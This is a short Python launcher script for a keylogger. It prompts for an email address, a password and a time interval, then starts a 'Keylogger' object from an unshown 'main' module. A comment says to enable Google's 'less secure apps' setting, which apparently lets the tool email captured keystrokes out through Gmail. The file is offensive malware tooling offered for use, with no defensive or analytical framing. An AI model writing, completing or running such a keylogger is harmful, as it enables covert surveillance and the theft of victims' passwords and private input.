import main
import getpass


#   First enable this ------> https://myaccount.google.com/lesssecureapps

email = input("Enter your email: ")
password = getpass.getpass("Enter your password: ")
time_interval = int(input("Enter the time interval (in seconds): "))



my_keylogger = main.Keylogger(time_interval, email, password)
my_keylogger.start()





